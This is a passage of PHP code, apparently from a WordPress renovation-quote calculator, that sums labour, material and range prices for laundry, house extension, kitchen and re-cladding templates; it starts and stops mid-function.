										$labour_and_material_total = $labour_and_material_total + $selectionPrice;
										// *** END ***

										$proposed_total = $proposed_total + ($labour_and_material_total * $extra_count);
								}
								elseif($proposed_prices == 'range') {
										$range_price_total = $fixture['range_price'];
										$proposed_total = $proposed_total + ( $range_price_total * $extra_count );
								}

						}
				}

		
				$floors = $data['floors'];
				$floors_total = 0;
				foreach($floors_data as $temp) {
						if( $temp['title'] == $floors ) {

								if($floors_prices == 'labour') {
										$labour_price_total = $temp['labour'];
										$labour_price_total_value = 0;
										$material_price_total = $temp['material'];
										$material_price_total_value = 0;
										foreach($labour_price_total as $l) {
												$labour_price_total_value = $labour_price_total_value + $l['price'];
										}
										foreach($material_price_total as $m) {
												$material_price_total_value = $material_price_total_value + $m['price'];
										}
										$labour_and_material_total = $labour_price_total_value + $material_price_total_value;

										// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
										$selectionPrice = 0;
										$selectionPrice = go_calculate_selection($selectionsData,$floors_title,$temp['title']);
										$labour_and_material_total = $labour_and_material_total + $selectionPrice;
										// *** END ***

										$floors_total = $labour_and_material_total * $floor_area;
								}
								elseif($floors_prices == 'range') {
										$range_price_total = $temp['range_price'];
										$floors_total = $range_price_total * $floor_area;
								}

						}
				}

				$walls = $data['walls'];
				$walls_total = 0;
				foreach($walls_data as $temp) {
						if( $temp['title'] == $walls ) {

								if($walls_prices == 'labour') {
										$labour_price_total = $temp['labour'];
										$labour_price_total_value = 0;
										$material_price_total = $temp['material'];
										$material_price_total_value = 0;
										foreach($labour_price_total as $l) {
												$labour_price_total_value = $labour_price_total_value + $l['price'];
										}
										foreach($material_price_total as $m) {
												$material_price_total_value = $material_price_total_value + $m['price'];
										}
										$labour_and_material_total = $labour_price_total_value + $material_price_total_value;

										// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
										$selectionPrice = 0;
										$selectionPrice = go_calculate_selection($selectionsData,$walls_title,$temp['title']);
										$labour_and_material_total = $labour_and_material_total + $selectionPrice;
										// *** END ***

										$walls_total = $labour_and_material_total * $wall_area;
								}
								elseif($walls_prices == 'range') {
										$range_price_total = $temp['range_price'];
										$walls_total = $range_price_total * $wall_area;
								}

						}
				}

				$extra = $data['extra'];
				$extra_total = 0;
				foreach($extra_data as $temp) {
						if( in_array($temp['title'],$extra) ) {

								// let's count QNT of each extra field
								$field_title = $temp['title'];
								$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
								$count_field_title = strtolower($count_field_title);
								$extra_count = $data['' . $count_field_title . ''];
								if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
									   $extra_count = 1;
								}

								if($extra_prices == 'labour') {
										$labour_price_total = $temp['labour'];
										$labour_price_total_value = 0;
										$material_price_total = $temp['material'];
										$material_price_total_value = 0;
										foreach($labour_price_total as $l) {
												$labour_price_total_value = $labour_price_total_value + $l['price'];
										}
										foreach($material_price_total as $m) {
												$material_price_total_value = $material_price_total_value + $m['price'];
										}
										$labour_and_material_total = $labour_price_total_value + $material_price_total_value;

										// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
										$selectionPrice = 0;
										$selectionPrice = go_calculate_selection($selectionsData,$extra_title,$temp['title']);
										$labour_and_material_total = $labour_and_material_total + $selectionPrice;
										// *** END ***

										$extra_total = $extra_total +  ( $labour_and_material_total * $extra_count);
								}
								elseif($extra_prices == 'range') {
										$range_price_total = $temp['range_price'];
										$extra_total = $extra_total + ( $range_price_total * $extra_count);
								}

						}

				}

				$laundry_total = $current_total + $proposed_total + $ceilings_total + $floors_total + $walls_total + $extra_total;

				$total = $laundry_total;
				$full_total = $laundry_total;

	}
	

	// V2 formulas for House Extension template
	if(get_the_title($t) == 'House Extension') {

			$all_scope_data = get_field('quote_fields',$t);
			$house_extension_total = 0;

			$width = $data['area_width'];
			$length = $data['area_length'];

			$floor_area = $width * $length;

			foreach($all_scope_data as $d) {
					if($d['slug'] == 'rooms') {
							$pick_rooms_title = $d['title'];
							$pick_rooms_prices = $d['type_of_price'];
							$pick_rooms_data = $d['fields'];
					}
					if($d['slug'] == 'foundation') {
							$foundation_title = $d['title'];
							$foundation_prices = $d['type_of_price'];
							$foundation_data = $d['fields'];
					}
					if($d['slug'] == 'cladding') {
							$cladding_title = $d['title'];
							$cladding_prices = $d['type_of_price'];
							$cladding_data = $d['fields'];
					}
					if($d['slug'] == 'roof') {
							$roof_title = $d['title'];
							$roof_prices = $d['type_of_price'];
							$roof_data = $d['fields'];
					}
					if($d['slug'] == 'site') {
							$site_title = $d['title'];
							$site_prices = $d['type_of_price'];
							$site_data = $d['fields'];
					}
			}

			$pick_rooms = $data['rooms'];
			$pick_rooms_total = 0;
			foreach($pick_rooms_data as $temp) {
					if( in_array($temp['title'],$pick_rooms) ) {

							// let's count QNT of each extra field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$extra_count = $data['' . $count_field_title . ''];
							if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
								   $extra_count = 1;
							}

							if($pick_rooms_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$pick_rooms_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$pick_rooms_total = $pick_rooms_total + ( $labour_and_material_total * $extra_count );
							}
							elseif($pick_rooms_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$pick_rooms_total = $pick_rooms_total + ( $range_price_total * $extra_count );
							}

					}
			}

			$foundation = $data['foundation'];
			$foundation_total = 0;
			foreach($foundation_data as $temp) {
					if( $temp['title'] == $foundation ) {

							if($foundation_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$foundation_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$foundation_total = $labour_and_material_total;
							}
							elseif($foundation_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$foundation_total = $range_price_total;
							}

					}
			}

			$wall_cladding = $data['cladding'];
			$wall_cladding_total = 0;
			foreach($cladding_data as $temp) {
					if( $temp['title'] == $wall_cladding ) {

							if($cladding_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$cladding_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$wall_cladding_total = $labour_and_material_total;
							}
							elseif($cladding_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$wall_cladding_total = $range_price_total;
							}

					}
			}

			$roof_cladding = $data['roof'];
			$roof_cladding_total = 0;
			foreach($roof_data as $temp) {
					if( $temp['title'] == $wall_cladding ) {

							if($roof_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$roof_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$roof_cladding_total = $labour_and_material_total;
							}
							elseif($roof_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$roof_cladding_total = $range_price_total;
							}

					}
			}

			$site = $data['site'];
			$site_total_1 = 0;
			$site_total_2 = 0;
			foreach($site_data as $temp) {
					if( in_array($temp['title'],$site) && ( $temp['title'] == 'Easy Access' || $temp['title'] == 'Flat land' || $temp['title'] == 'Difficult Access' || $temp['title'] == 'Sloping Site' || $temp['title'] == 'Minor Demolition' || $temp['title'] == 'Major Demolition' ) ) {

							$range_price_total = $temp['range_price'];
							$site_total_1 = $range_price_total;

					}
					elseif( in_array($temp['title'],$site) && ( $temp['title'] == 'Scaffolding Needed' ) ) {

							$range_price_total = $temp['range_price'];
							$site_total_2 = $range_price_total;

					}
			}

			$house_sub_total = $foundation_total + $roof_cladding_total + $wall_cladding_total;
			$site_total_summ = ($house_sub_total * $site_total_1)/100;

			$house_extension_total = $floor_area * ( $house_sub_total + $site_total_summ ) + $site_total_2 + $pick_rooms_total;
			$total = $total + $house_extension_total;

	}

	// V2 formulas for Kitchen template
	if(get_the_title($t) == 'Kitchen Renovation') {

			$all_scope_data = get_field('quote_fields',$t);

			$kitchen_total_price = 0;
			$width = $data['area_width'];
				$length = $data['area_length'];
        $height = $data['height'];
				$floor_area = $width * $length;
        $wall_area = ($width + $width + $length + $length) * $height;
		
			foreach($all_scope_data as $d) {
					if($d['slug'] == 'current') {
								$current_title = $d['title'];
								$current_prices = $d['type_of_price'];
								$current_data = $d['fields'];
						}
						if($d['slug'] == 'proposed') {
								$proposed_titles = $d['title'];
								$proposed_prices = $d['type_of_price'];
								$proposed_data = $d['fields'];
						}
						if($d['slug'] == 'ceilings') {
								$ceilings_title = $d['title'];
								$ceilings_prices = $d['type_of_price'];
								$ceilings_data = $d['fields'];
						}
						if($d['slug'] == 'floors') {
								$floors_title = $d['title'];
								$floors_prices = $d['type_of_price'];
								$floors_data = $d['fields'];
						}
						if($d['slug'] == 'walls') {
								$walls_title = $d['title'];
								$walls_prices = $d['type_of_price'];
								$walls_data = $d['fields'];
						}
						if($d['slug'] == 'extras') {
								$extra_title = $d['title'];
								$extra_prices = $d['type_of_price'];
								$extra_data = $d['fields'];
						}
					if($d['slug'] == 'cabinetry') {
							$layout_title = $d['title'];
							$layout_prices = $d['type_of_price'];
							$layout_data = $d['fields'];
					}
					if($d['slug'] == 'cabinets') {
							$cabinets_title = $d['type_of_price'];
							$cabinets_prices = $d['type_of_price'];
							$cabinets_data = $d['fields'];
					}
					if($d['slug'] == 'island') {
							$island_title = $d['title'];
							$island_prices = $d['type_of_price'];
							$island_data = $d['fields'];
					}
					if($d['slug'] == 'benchtop') {
							$benchtop_title = $d['type_of_price'];
							$benchtop_prices = $d['type_of_price'];
							$benchtop_data = $d['fields'];
					}
					if($d['slug'] == 'finish') {
						  $finish_title = $d['type_of_price'];
							$finish_prices = $d['type_of_price'];
							$finish_data = $d['fields'];
					}
						if($d['slug'] == 'appliances') {
						  $appliances_title = $d['type_of_price'];
							$appliances_prices = $d['type_of_price'];
							$appliances_data = $d['fields'];
					}
				}

			
		$demolition = $data['demolition'];
				$current = $data['current'];
				$current_total = 0;
				if($demolition == 'Yes') {
						foreach($current_data as $fixture) {
								if( in_array($fixture['title'],$current) && $fixture['title'] != 'Tiled Wall' && $fixture['title'] != 'Tiled Floor' && $fixture['title'] != 'Vinyl Floor') {

										// let's count QNT of each extra field
										$field_title = $fixture['title'];
										$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
										$count_field_title = strtolower($count_field_title);
										$extra_count = $data['' . $count_field_title . ''];
										if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
											   $extra_count = 1;
										}

										if($current_prices == 'labour') {
												$labour_price_total = $fixture['labour'];
												$labour_price_total_value = 0;
												$material_price_total = $fixture['material'];
												$material_price_total_value = 0;
												foreach($labour_price_total as $l) {
														$labour_price_total_value = $labour_price_total_value + $l['price'];
												}
												foreach($material_price_total as $m) {
														$material_price_total_value = $material_price_total_value + $m['price'];
												}
												$labour_and_material_total = $labour_price_total_value + $material_price_total_value;

												// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
												$selectionPrice = 0;
												$selectionPrice = go_calculate_selection($selectionsData,$current_title,$fixture['title']);
												$labour_and_material_total = $labour_and_material_total + $selectionPrice;
												// *** END ***

												$current_total = $current_total + ($labour_and_material_total * $extra_count);
										}
										elseif($current_prices == 'range') {
												$range_price_total = $fixture['range_price'];
												$current_total = $current_total + ($range_price_total * $extra_count);
										}

								}
								elseif( in_array($fixture['title'],$current) && $fixture['title'] == 'Tiled Wall') {

										// let's count QNT of each extra field
										$field_title = $fixture['title'];
										$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
										$count_field_title = strtolower($count_field_title);
										$extra_count = $data['' . $count_field_title . ''];
										if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
											   $extra_count = 1;
										}

										if($current_prices == 'labour') {
												$labour_price_total = $fixture['labour'];
												$labour_price_total_value = 0;
												$material_price_total = $fixture['material'];
												$material_price_total_value = 0;
												foreach($labour_price_total as $l) {
														$labour_price_total_value = $labour_price_total_value + $l['price'];
												}
												foreach($material_price_total as $m) {
														$material_price_total_value = $material_price_total_value + $m['price'];
												}
												$labour_and_material_total = $labour_price_total_value + $material_price_total_value;

												// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
												$selectionPrice = 0;
												$selectionPrice = go_calculate_selection($selectionsData,$current_title,$fixture['title']);
												$labour_and_material_total = $labour_and_material_total + $selectionPrice;
												// *** END ***

												$current_total = $current_total + ( $labour_and_material_total * $wall_area * $extra_count);
										}
										elseif($current_prices == 'range') {
												$range_price_total = $fixture['range_price'];
												$current_total = $current_total + ( $range_price_total * $wall_area * $extra_count);
										}

								}
								elseif( in_array($fixture['title'],$current) && ( $fixture['title'] == 'Tiled Floor' || $fixture['title'] == 'Vinyl Floor' )) {

										// let's count QNT of each extra field
										$field_title = $fixture['title'];
										$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
										$count_field_title = strtolower($count_field_title);
										$extra_count = $data['' . $count_field_title . ''];
										if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
											   $extra_count = 1;
										}

										if($current_prices == 'labour') {
												$labour_price_total = $fixture['labour'];
												$labour_price_total_value = 0;
												$material_price_total = $fixture['material'];
												$material_price_total_value = 0;
												foreach($labour_price_total as $l) {
														$labour_price_total_value = $labour_price_total_value + $l['price'];
												}
												foreach($material_price_total as $m) {
														$material_price_total_value = $material_price_total_value + $m['price'];
												}
												$labour_and_material_total = $labour_price_total_value + $material_price_total_value;

												// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
												$selectionPrice = 0;
												$selectionPrice = go_calculate_selection($selectionsData,$current_title,$fixture['title']);
												$labour_and_material_total = $labour_and_material_total + $selectionPrice;
												// *** END ***

												$current_total = $current_total + ( $labour_and_material_total * $floor_area);
										}
										elseif($current_prices == 'range') {
												$range_price_total = $fixture['range_price'];
												$current_total = $current_total + ( $range_price_total * $floor_area);
										}

								}
						}

				}
				else {
					 $current_total = 0;
				}

		    $ceilings = $data['ceilings'];
				$ceilings_total = 0;
				foreach($ceilings_data as $temp) {
						if( $temp['title'] == $ceilings ) {

								if($ceilings_prices == 'labour') {
										$labour_price_total = $temp['labour'];
										$labour_price_total_value = 0;
										$material_price_total = $temp['material'];
										$material_price_total_value = 0;
										foreach($labour_price_total as $l) {
												$labour_price_total_value = $labour_price_total_value + $l['price'];
										}
										foreach($material_price_total as $m) {
												$material_price_total_value = $material_price_total_value + $m['price'];
										}
										$labour_and_material_total = $labour_price_total_value + $material_price_total_value;

										// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
										$selectionPrice = 0;
										$selectionPrice = go_calculate_selection($selectionsData,$ceilings_title,$temp['title']);
										$labour_and_material_total = $labour_and_material_total + $selectionPrice;
										// *** END ***

										$ceilings_total = $ceilings_total + ($labour_and_material_total * $floor_area);
								}
								elseif($ceilings_prices == 'range') {
										$range_price_total = $temp['range_price'];
										$ceilings_total = $ceilings_total + ($range_price_total * $floor_area);
								}

						}
				}


				$proposed = $data['proposed'];
				$proposed_total = 0;
				foreach($proposed_data as $fixture) {
						if( in_array($fixture['title'],$proposed) ) {

								// let's count QNT of each extra field
								$field_title = $fixture['title'];
								$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
								$count_field_title = strtolower($count_field_title);
								$extra_count = $data['' . $count_field_title . ''];
								if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
									   $extra_count = 1;
								}

								if($proposed_prices == 'labour') {
										$labour_price_total = $fixture['labour'];
										$labour_price_total_value = 0;
										$material_price_total = $fixture['material'];
										$material_price_total_value = 0;
										foreach($labour_price_total as $l) {
												$labour_price_total_value = $labour_price_total_value + $l['price'];
										}
										foreach($material_price_total as $m) {
												$material_price_total_value = $material_price_total_value + $m['price'];
										}
										$labour_and_material_total = $labour_price_total_value + $material_price_total_value;

										// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
										$selectionPrice = 0;
										$selectionPrice = go_calculate_selection($selectionsData,$proposed_titles,$field_title);

										$labour_and_material_total = $labour_and_material_total + $selectionPrice;
										// *** END ***

										$proposed_total = $proposed_total + ($labour_and_material_total * $extra_count);
								}
								elseif($proposed_prices == 'range') {
										$range_price_total = $fixture['range_price'];
										$proposed_total = $proposed_total + ( $range_price_total * $extra_count );
								}

						}
				}

		
				$floors = $data['floors'];
				$floors_total = 0;
				foreach($floors_data as $temp) {
						if( $temp['title'] == $floors ) {

								if($floors_prices == 'labour') {
										$labour_price_total = $temp['labour'];
										$labour_price_total_value = 0;
										$material_price_total = $temp['material'];
										$material_price_total_value = 0;
										foreach($labour_price_total as $l) {
												$labour_price_total_value = $labour_price_total_value + $l['price'];
										}
										foreach($material_price_total as $m) {
												$material_price_total_value = $material_price_total_value + $m['price'];
										}
										$labour_and_material_total = $labour_price_total_value + $material_price_total_value;

										// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
										$selectionPrice = 0;
										$selectionPrice = go_calculate_selection($selectionsData,$floors_title,$temp['title']);
										$labour_and_material_total = $labour_and_material_total + $selectionPrice;
										// *** END ***

										$floors_total = $floor_total + ($labour_and_material_total * $floor_area);
								}
								elseif($floors_prices == 'range') {
										$range_price_total = $temp['range_price'];
										$floors_total = $floors_total + ($range_price_total * $floor_area);
								}

						}
				}

				$walls = $data['walls'];
				$walls_total = 0;
				foreach($walls_data as $temp) {
						if( $temp['title'] == $walls ) {

								if($walls_prices == 'labour') {
										$labour_price_total = $temp['labour'];
										$labour_price_total_value = 0;
										$material_price_total = $temp['material'];
										$material_price_total_value = 0;
										foreach($labour_price_total as $l) {
												$labour_price_total_value = $labour_price_total_value + $l['price'];
										}
										foreach($material_price_total as $m) {
												$material_price_total_value = $material_price_total_value + $m['price'];
										}
										$labour_and_material_total = $labour_price_total_value + $material_price_total_value;

										// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
										$selectionPrice = 0;
										$selectionPrice = go_calculate_selection($selectionsData,$walls_title,$temp['title']);
										$labour_and_material_total = $labour_and_material_total + $selectionPrice;
										// *** END ***

										$walls_total = $walls_total + ($labour_and_material_total * $wall_area);
								}
								elseif($walls_prices == 'range') {
										$range_price_total = $temp['range_price'];
										$walls_total = $walls_total + ($range_price_total * $wall_area);
								}

						}
				}

				$extra = $data['extra'];
				$extra_total = 0;
				foreach($extra_data as $temp) {
						if( in_array($temp['title'],$extra) ) {

								// let's count QNT of each extra field
								$field_title = $temp['title'];
								$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
								$count_field_title = strtolower($count_field_title);
								$extra_count = $data['' . $count_field_title . ''];
								if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
									   $extra_count = 1;
								}

								if($extra_prices == 'labour') {
										$labour_price_total = $temp['labour'];
										$labour_price_total_value = 0;
										$material_price_total = $temp['material'];
										$material_price_total_value = 0;
										foreach($labour_price_total as $l) {
												$labour_price_total_value = $labour_price_total_value + $l['price'];
										}
										foreach($material_price_total as $m) {
												$material_price_total_value = $material_price_total_value + $m['price'];
										}
										$labour_and_material_total = $labour_price_total_value + $material_price_total_value;

										// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
										$selectionPrice = 0;
										$selectionPrice = go_calculate_selection($selectionsData,$extra_title,$temp['title']);
										$labour_and_material_total = $labour_and_material_total + $selectionPrice;
										// *** END ***

										$extra_total = $extra_total +  ( $labour_and_material_total * $extra_count);
								}
								elseif($extra_prices == 'range') {
										$range_price_total = $temp['range_price'];
										$extra_total = $extra_total + ( $range_price_total * $extra_count);
								}

						}

				}

			$layout = $data['cabinetry'];
			$layout_total = 0;
			foreach($layout_data as $temp) {
					if( $temp['title'] == $layout ) {

							if($layout_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$layout_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$layout_total = $labour_and_material_total;
							}
							elseif($layout_prices == 'range') {
									$range_price_total = $temp['range_price'];
									$layout_total = $range_price_total;
							}

					}
			}

			    $cabinets = $data['cabinets'];
					$cabinets_total = 0;
					foreach($cabinets_data as $temp) {
							if( in_array($temp['title'],$cabinets) ) {

							// let's count QNT of each extra field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$cabinets_count = $data['' . $count_field_title . ''];
							if($cabinets_count == NULL || $cabinets_count == '' || empty($cabinets_count)) {
								   $cabinets_count = 1;
							}

							if($cabinets_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$cabinets_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$cabinets_total = $cabinets_total +  ( $labour_and_material_total * $cabinets_count);
							}
							elseif($cabinets_prices == 'range')
									$range_price_total = $temp['range_price'];
									$cabinets_total = $cabinets_total + ( $range_price_total * $cabinets_count);
							}

					}


			    $benchtop = $data['benchtop'];
					$benchtop_total = 0;
					foreach($benchtop_data as $temp) {
							if($temp['title'] == $benchtop ) {

							// let's count QNT of each extra field
							$field_title = $temp['title'];
							$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
							$count_field_title = strtolower($count_field_title);
							$benchtop_count = $data['' . $count_field_title . ''];
							if($benchtop_count == NULL || $benchtop_count == '' || empty($benchtop_count)) {
								   $benchtop_count = 1;
							}

							if($benchtop_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
									foreach($labour_price_total as $l) {
											$labour_price_total_value = $labour_price_total_value + $l['price'];
									}
									foreach($material_price_total as $m) {
											$material_price_total_value = $material_price_total_value + $m['price'];
									}
									$labour_and_material_total = $labour_price_total_value + $material_price_total_value;
									// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
									$selectionPrice = 0;
									$selectionPrice = go_calculate_selection($selectionsData,$benchtop_title,$temp['title']);
									$labour_and_material_total = $labour_and_material_total + $selectionPrice;
									// *** END ***

									$benchtop_total = $benchtop_total +  ( $labour_and_material_total * $benchtop_count);
							}
							elseif($benchtop_prices == 'range')
									$range_price_total = $temp['range_price'];
									$benchtop_total = $benchtop_total + ( $range_price_total * $benchtop_count);
							}

					}



			$finish = $data['finish'];
			$finish_total = 0;
			foreach($finish_data as $temp) {
					if( $temp['title'] == $finish ) {

							$range_price_total = $temp['range_price'];
							$finish_total = $range_price_total;

					}
			}
		
		  	$appliances = $data['appliances'];
				$appliances_total = 0;
				foreach($appliances_data as $temp) {
						if( in_array($temp['title'],$appliances) ) {

								// let's count QNT of each appliances field
								$field_title = $temp['title'];
								$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
								$count_field_title = strtolower($count_field_title);
								$appliances_count = $data['' . $count_field_title . ''];
								if($appliances_count == NULL || $appliances_count == '' || empty($appliances_count)) {
									   $appliances_count = 1;
								}

								if($appliances_prices == 'labour') {
										$labour_price_total = $temp['labour'];
										$labour_price_total_value = 0;
										$material_price_total = $temp['material'];
										$material_price_total_value = 0;
										foreach($labour_price_total as $l) {
												$labour_price_total_value = $labour_price_total_value + $l['price'];
										}
										foreach($material_price_total as $m) {
												$material_price_total_value = $material_price_total_value + $m['price'];
										}
										$labour_and_material_total = $labour_price_total_value + $material_price_total_value;

										// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
										$selectionPrice = 0;
										$selectionPrice = go_calculate_selection($selectionsData,$appliances_title,$temp['title']);
										$labour_and_material_total = $labour_and_material_total + $selectionPrice;
										// *** END ***

										$appliances_total = $appliances_total +  ( $labour_and_material_total * $appliances_count);
								}
								elseif($appliances_prices == 'range') {
										$range_price_total = $temp['range_price'];
										$appliances_total = $appliances_total + ( $range_price_total * $appliances_count);
								}

						}
				}
		
				$island = $data['island'];
				$island_total = 0;
				foreach($island_data as $temp) {
						if( in_array($temp['title'],$island) ) {

								// let's count QNT of each island field
								$field_title = $temp['title'];
								$count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
								$count_field_title = strtolower($count_field_title);
								$island_count = $data['' . $count_field_title . ''];
								if($island_count == NULL || $island_count == '' || empty($island_count)) {
									   $island_count = 1;
								}

								if($island_prices == 'labour') {
										$labour_price_total = $temp['labour'];
										$labour_price_total_value = 0;
										$material_price_total = $temp['material'];
										$material_price_total_value = 0;
										foreach($labour_price_total as $l) {
												$labour_price_total_value = $labour_price_total_value + $l['price'];
										}
										foreach($material_price_total as $m) {
												$material_price_total_value = $material_price_total_value + $m['price'];
										}
										$labour_and_material_total = $labour_price_total_value + $material_price_total_value;

										// calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
										$selectionPrice = 0;
										$selectionPrice = go_calculate_selection($selectionsData,$island_title,$temp['title']);
										$labour_and_material_total = $labour_and_material_total + $selectionPrice;
										// *** END ***

										$island_total = $island_total +  ( $labour_and_material_total * $island_count);
								}
								elseif($island_prices == 'range') {
										$range_price_total = $temp['range_price'];
										$island_total = $island_total + ( $range_price_total * $island_count);
								}

						}
				}
		
		
			$layout_sub = $cabinets_total + $island_total;
			$finish_sub = ($layout_sub * $finish_total)/100;

			$layout_full = $layout_sub + $finish_sub;

		  $kitchen_sub = ($layout_full) * $layout_total / 100;
			$kitchen_full = $layout_full + $kitchen_sub;

			$kitchen_total_price = $ceilings_total + $benchtop_total + $appliances_total + $current_total + $kitchen_full + $floors_total + $walls_total + $extra_total + $proposed_total;
			$total = $total + $kitchen_total_price;

	}

	// V2 formulas for Recladding template
	if(get_the_title($t) == 'Re-Cladding') {

			$all_scope_data = get_field('quote_fields',$t);

			$width = $data['area_width'];
			$length = $data['area_length'];

			foreach($all_scope_data as $d) {
					if($d['slug'] == 'ceiling') {
							$height_data = $d['fields'];
					}
					if($d['slug'] == 'current') {
							$current_cladding_title = $d['title'];
							$current_cladding_prices = $d['type_of_price'];
							$current_cladding_data = $d['fields'];
					}
					if($d['slug'] == 'joinery') {
							  $windows_and_doors_title = $d['title'];
							$windows_and_doors_prices = $d['type_of_price'];
							$windows_and_doors_data = $d['fields'];
					}
					if($d['slug'] == 'proposed') {
							$proposed_title = $d['title'];
							$proposed_prices = $d['type_of_price'];
							$proposed_data = $d['fields'];
					}
					if($d['slug'] == 'paint') {
							$painted_title = $d['title'];
							$painted_prices = $d['type_of_price'];
							$painted_data = $d['fields'];
					}
			}

			$height = $data['ceiling'];
			$height_total = 0;
			foreach($height_data as $temp) {
					if( $temp['title'] == $height ) {

							$range_price_total = $temp['range_price'];
							$height_total = $range_price_total;

					}
			}

			$wall_area = ( $width + $width + $length + $length ) * $height_total;

			$current_cladding = $data['current'];
			$current_cladding_total = 0;
			foreach($current_cladding_data as $temp) {
					if( $temp['title'] == $current_cladding ) {

							if($current_cladding_prices == 'labour') {
									$labour_price_total = $temp['labour'];
									$labour_price_total_value = 0;
									$material_price_total = $temp['material'];
									$material_price_total_value = 0;
